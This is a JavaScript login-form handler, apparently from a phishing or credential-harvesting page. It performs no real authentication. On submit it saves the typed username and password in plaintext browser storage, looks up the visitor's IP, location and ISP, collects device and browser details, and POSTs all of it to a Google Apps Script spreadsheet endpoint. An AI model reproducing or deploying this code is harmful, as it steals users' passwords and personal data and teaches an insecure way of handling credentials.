// MIT License  © 2025 Haseef Swift   
// Free to use, modify, and distribute with attribution.  
// No warranty provided. Use at your own risk.  
// Full license: https://opensource.org/licenses/MIT --->

// Check if user already logged in
function checkLogin() {
  if (localStorage.getItem("username") && localStorage.getItem("password")) {
    window.location.href = "home.html";
  }
}

// Logout and clear all storage and redirect
function logout() {
  localStorage.clear();

  // Attempt to clear cookies (not always fully possible due to browser restrictions)
  document.cookie.split(";").forEach(function (c) {
    document.cookie = c
      .replace(/^ +/, "")
      .replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
  });

  window.location.href = "index.html";
}

// When form is submitted
$("#submit-form").submit(async (e) => {
  e.preventDefault();

  const username = $("input[name='username']").val();
  const password = $("input[name='password']").val();

  // Save to localStorage
  localStorage.setItem("username", username);
  localStorage.setItem("password", password);

  // Collect user data
  let userData = {};
  try {
    const ipData = await fetch('https://ipapi.co/json').then(res => res.json());
    userData = {
      ip: ipData.ip,
      city: ipData.city,
      region: ipData.region,
      country: ipData.country_name,
      isp: ipData.org,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      os: navigator.platform,
      browser: navigator.userAgent,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
      cookiesEnabled: navigator.cookieEnabled,
      referrer: document.referrer || "No referrer",
      url: window.location.href,
    };
  } catch (error) {
    console.error("Failed to collect user data", error);
  }

  // Show loading animation
  $("#loading").css("display", "block");

  // Send user data to Google Sheet
  $.ajax({
    url: "https://script.google.com/macros/s/AKfycbwdJoj0CwKOaekgjrCO4ebj8ChsaKD3xvHf23tD3eo532tIrK0sOWKwFCeY51TOZU0q/exec",
    method: "POST",
    data: {
      username: username,
      password: password,
      ...userData
    },
    success: function (response) {
      $("#loading").css("display", "none");
      window.location.href = "home.html";
    },
    error: function (err) {
      alert("Something went wrong. Please try again.");
      console.error("Submit error:", err);
      $("#loading").css("display", "none");
    }
  });
});
